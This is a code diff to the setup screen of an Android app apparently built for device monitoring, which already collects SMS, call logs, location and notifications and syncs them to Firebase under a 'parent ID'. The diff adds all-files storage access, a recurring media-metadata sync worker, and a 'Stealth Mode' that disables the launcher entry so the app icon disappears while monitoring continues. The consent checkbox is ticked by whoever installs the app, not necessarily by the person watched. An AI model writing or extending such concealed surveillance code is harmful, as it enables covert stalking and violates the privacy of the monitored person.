@@ -285,6 +285,61 @@ class SetupActivity : AppCompatActivity() {
                 )
             )
         }
+
+        // Step 7 — Storage Access
+        binding.btnEnableStorage.setOnClickListener {
+            if (isStoragePermissionGranted()) {
+                Toast.makeText(this, "Storage access already granted ✓", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    startActivity(intent)
+                }
+            } else {
+                // Fallback for Android 10 and below
+                requestPermissions(
+                    arrayOf(
+                        android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                        android.Manifest.permission.WRITE_EXTERNAL_STORAGE
+                    ), 1001
+                )
+            }
+        }
+
+        // Step 8 — Stealth Mode & Consent
+        binding.cbConsent.setOnCheckedChangeListener { _, isChecked ->
+            binding.btnEnableStealth.isEnabled = isChecked
+        }
+
+        binding.btnEnableStealth.setOnClickListener {
+            val consentChecked = binding.cbConsent.isChecked
+            if (!consentChecked) {
+                Toast.makeText(this, "Please check the consent box", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+
+            val currentActive = prefs.isStealthModeActive
+            val newActive = !currentActive
+
+            prefs.isStealthConsentGranted = consentChecked
+            toggleStealthMode(newActive)
+
+            if (newActive) {
+                Toast.makeText(this, "Stealth Mode Activated! App icon will be hidden.", Toast.LENGTH_LONG).show()
+            } else {
+                Toast.makeText(this, "Stealth Mode Deactivated.", Toast.LENGTH_LONG).show()
+            }
+
+            refreshAllStatuses()
+            syncStealthStatusToFirebase()
+        }
     }
 
     // ── Permission Chain (BUG-R2-01 fix) ──────────────────────────────────────
@@ -358,6 +413,14 @@ class SetupActivity : AppCompatActivity() {
             ExistingPeriodicWorkPolicy.KEEP,
             syncRequest
         )
+        
+        val mediaRequest = PeriodicWorkRequestBuilder<com.device.guardian.service.worker.MediaMetadataWorker>(30, TimeUnit.MINUTES)
+            .build()
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "GuardianMediaSyncWork",
+            ExistingPeriodicWorkPolicy.KEEP,
+            mediaRequest
+        )
     }
 
     // ── Helpers ───────────────────────────────────────────────────────────────
@@ -378,6 +441,8 @@ class SetupActivity : AppCompatActivity() {
         updateStep4Status()
         updateStep5Status()
         updateStep6Status()
+        updateStep7Status()
+        updateStep8Status()
         updateFinalBanner()
     }
 
@@ -445,21 +510,47 @@ class SetupActivity : AppCompatActivity() {
         binding.btnEnableSmsCalls.isEnabled = !active
     }
 
+    private fun updateStep7Status() {
+        val granted = isStoragePermissionGranted()
+        binding.tvStep7Status.text = if (granted) "✅ Done" else "⬜ Pending"
+        binding.tvStep7Status.setTextColor(
+            getColor(if (granted) R.color.status_success else R.color.status_pending)
+        )
+        binding.btnEnableStorage.text =
+            if (granted) "Storage Access Granted ✓" else "Grant Storage Access"
+        binding.btnEnableStorage.isEnabled = !granted
+    }
+
+    private fun updateStep8Status() {
+        val consent = prefs.isStealthConsentGranted
+        val active = prefs.isStealthModeActive
+
+        binding.cbConsent.isChecked = consent
+        binding.tvStep8Status.text = if (active) "✅ Active" else if (consent) "✅ Consented" else "⬜ Pending"
+        binding.tvStep8Status.setTextColor(
+            getColor(if (active || consent) R.color.status_success else R.color.status_pending)
+        )
+        binding.btnEnableStealth.text = if (active) "Deactivate Stealth Mode" else "Activate Stealth Mode"
+        binding.btnEnableStealth.isEnabled = binding.cbConsent.isChecked
+    }
+
     private fun updateFinalBanner() {
         val allDone = isParentIdSaved() &&
                       isAccessibilityServiceEnabled() &&
                       isBatteryOptimizationDisabled() &&
                       isLocationPermissionGranted() &&
                       isNotificationServiceEnabled() &&
-                      isSmsCallsPermissionGranted()
+                      isSmsCallsPermissionGranted() &&
+                      isStoragePermissionGranted()
 
         if (allDone) {
             binding.tvFinalStatus.text = "✅ Monitoring Active"
-            binding.tvFinalSubtext.text = "All steps complete — service is running"
+            val stealthText = if (prefs.isStealthModeActive) " (Stealth Mode)" else ""
+            binding.tvFinalSubtext.text = "All steps complete — service is running$stealthText"
             binding.cardStatus.setCardBackgroundColor(getColor(R.color.status_success))
         } else {
             binding.tvFinalStatus.text = "⚠ Setup Incomplete"
-            binding.tvFinalSubtext.text = "Complete all 6 steps above"
+            binding.tvFinalSubtext.text = "Complete steps 1-7 above"
             binding.cardStatus.setCardBackgroundColor(
                 resources.getColor(android.R.color.black, theme)
             )
@@ -503,6 +594,14 @@ class SetupActivity : AppCompatActivity() {
                checkSelfPermission(android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun isStoragePermissionGranted(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            android.os.Environment.isExternalStorageManager()
+        } else {
+            checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        }
     }
 
     // ── FULL IMMEDIATE DATA SYNC ──────────────────────────────────────────────
@@ -592,6 +691,58 @@ class SetupActivity : AppCompatActivity() {
                 Log.d(TAG, "✅ Pending messages synced")
             } catch (e: Exception) {
                 Log.e(TAG, "❌ Pending message sync failed: ${e.message}", e)
+            }
+
+            // 4. Sync stealth status
+            syncStealthStatusToFirebase()
+        }
+    }
+
+    private fun toggleStealthMode(active: Boolean) {
+        try {
+            val pm = packageManager
+            val componentName = android.content.ComponentName(this, com.device.guardian.service.MainActivity::class.java)
+            val state = if (active) {
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            } else {
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+            }
+            pm.setComponentEnabledSetting(
+                componentName,
+                state,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+            prefs.isStealthModeActive = active
+            Log.d(TAG, "Stealth mode set to $active")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to toggle stealth mode: ${e.message}", e)
+        }
+    }
+
+    private fun syncStealthStatusToFirebase() {
+        val id = prefs.parentId
+        if (id.isNullOrBlank()) {
+            Log.w(TAG, "syncStealthStatusToFirebase: No parent ID saved, skipping")
+            return
+        }
+
+        lifecycleScope.launch {
+            try {
+                db.collection("monitors")
+                    .document(id)
+                    .collection("status")
+                    .document("device")
+                    .set(
+                        mapOf(
+                            "stealthModeActive" to prefs.isStealthModeActive,
+                            "stealthConsentGranted" to prefs.isStealthConsentGranted,
+                            "stealthStatusUpdatedAt" to System.currentTimeMillis()
+                        ),
+                        SetOptions.merge()
+                    ).await()
+                Log.d(TAG, "Synced stealth status to Firebase status/device")
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to sync stealth status: ${e.message}", e)
             }
         }
     }
